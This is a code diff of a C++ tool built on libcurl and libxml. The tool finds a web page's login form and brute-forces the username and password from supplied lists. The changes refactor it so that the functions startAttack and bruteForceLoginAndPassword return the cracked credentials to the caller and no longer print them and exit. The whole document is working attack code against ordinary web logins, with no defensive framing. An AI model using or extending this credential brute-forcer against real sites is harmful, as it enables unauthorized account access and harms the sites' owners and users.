@@ -115,7 +115,7 @@ static bool init(CURL *&conn, char *url){
   return true;
 }
 
-const xmlChar* findElement(const xmlChar **attributes, const char* element){
+const xmlChar* findElement(const xmlChar **attributes, const char *element){
 	for(int i = 0; *(attributes + i) != NULL; i++){
 		if(!strcasecmp((char*)(*(attributes + i)), element)){
 			return *(attributes + i + 1);
@@ -124,7 +124,7 @@ const xmlChar* findElement(const xmlChar **attributes, const char* element){
 	return NULL;
 }
 
-const xmlChar* findElementNameByType(const xmlChar **attributes, const char* elementType){
+const xmlChar* findElementNameByType(const xmlChar **attributes, const char *elementType){
 	for(int i = 0; *(attributes + i) != NULL; i++){
 		if(!strcasecmp((char*)(*(attributes + i)), "type") && !strcasecmp((char*)(*(attributes + i + 1)), elementType)){
 			for(int j = 0; *(attributes + j) != NULL; j++){
@@ -137,7 +137,7 @@ const xmlChar* findElementNameByType(const xmlChar **attributes, const char* ele
 	return NULL;
 }
 
-const xmlChar* findElementValueByType(const xmlChar **attributes, const char* elementType){
+const xmlChar* findElementValueByType(const xmlChar **attributes, const char *elementType){
 	for(int i = 0; *(attributes + i) != NULL; i++){
 		if(!strcasecmp((char*)(*(attributes + i)), elementType)){
 			return *(attributes + i + 1);
@@ -267,7 +267,7 @@ string* concat(char* action, const char *login, string loginValue, const char *p
 	return result;
 }
 
-static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passwords, Context& form, char* action){
+static bool bruteForceLoginAndPassword(list<string> &logins, list<string> &passwords, Context &form, char *action, string &login, string &password){
 	string *data;
 	CURLcode code;
 	CURL *curl;
@@ -276,19 +276,19 @@ static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passw
 	curl = curl_easy_init();
 	if(!curl){
 		cerr<<"curl initialization error \n";
-		return ;
+		return false;
 	}
 
 	code = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writer);
 	if (code != CURLE_OK){
 		fprintf(stderr, "Failed to set writer [%s]\n", errorBuffer);
-		return ;
+		return false;
 	}
 
 	code = curl_easy_setopt(curl, CURLOPT_WRITEDATA, &respBuffer);
 	if (code != CURLE_OK){
 		fprintf(stderr, "Failed to set write data [%s]\n", errorBuffer);
-		return ;
+		return false;
 	}
 
 	cout<<__LINE__<<endl;
@@ -325,14 +325,17 @@ static void bruteForceLoginAndPassword(list<string>& logins, list<string>& passw
 			if (strstr(respBuffer.c_str(), (*loginIt).c_str()) != NULL){
 				cout<<"Congradulation you have logged in\n";
 				cout<<"Login ="<<*loginIt<<" Password ="<<*passwordIt<<endl;
-				return;
+				login = *loginIt;
+				password = *passwordIt;
+				return true;
 			 }
 		}
 	}
 	cout<<"There is no login or password correspondance \n";
+	return false;
 }
 
-bool startAttack(string& hostName, list<string>& logins, list<string>& passwords){
+bool startAttack(string& hostName, list<string> &logins, list<string> &passwords, string &login, string &password){
 	CURL *conn = NULL;
 	CURLcode code;
 	if (!init(conn, (char*)hostName.c_str())){
@@ -358,19 +361,19 @@ bool startAttack(string& hostName, list<string>& logins, list<string>& passwords
 	if(!form.action){
 		fprintf(stderr, "There is no action in the given page \n");
 
-		exit(EXIT_FAILURE);
+		return false;
 	}
 
 	if(!form.containsForm){
 		fprintf(stderr, "There is no form in the given page \n");
 
-		exit(EXIT_FAILURE);
+		return false;
 	}
 
 	if(!form.login || !form.password){
 		fprintf(stderr, "There no login or password field \n");
 
-		exit(EXIT_FAILURE);
+		return false;
 	}
 	curl_easy_cleanup(conn);
 	curl_global_cleanup();
@@ -378,6 +381,6 @@ bool startAttack(string& hostName, list<string>& logins, list<string>& passwords
 	string newHost = hostName + "/" + first;
 	cout<<"new host name ="<<newHost<<endl;
 	cout<<"after c_str ="<<newHost.c_str()<<endl;
-	bruteForceLoginAndPassword(logins, passwords, form, (char*)newHost.c_str());
+	return bruteForceLoginAndPassword(logins, passwords, form, (char*)newHost.c_str(), login, password);
 }
 
